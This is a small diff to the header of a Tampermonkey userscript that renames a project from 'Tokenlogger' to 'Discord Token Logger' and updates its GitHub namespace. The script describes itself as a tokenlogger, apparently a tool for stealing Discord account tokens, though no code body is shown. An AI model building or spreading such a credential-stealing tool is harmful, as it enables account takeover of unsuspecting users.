@@ -1,6 +1,6 @@
 // ==UserScript==
-// @name         Tokenlogger
-// @namespace    https://github.com/Lyzev/Tokenlogger
+// @name         Discord Token Logger
+// @namespace    https://github.com/Lyzev/DiscordTokenLogger
 // @version      1.2
 // @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
 // @author       Lyzev
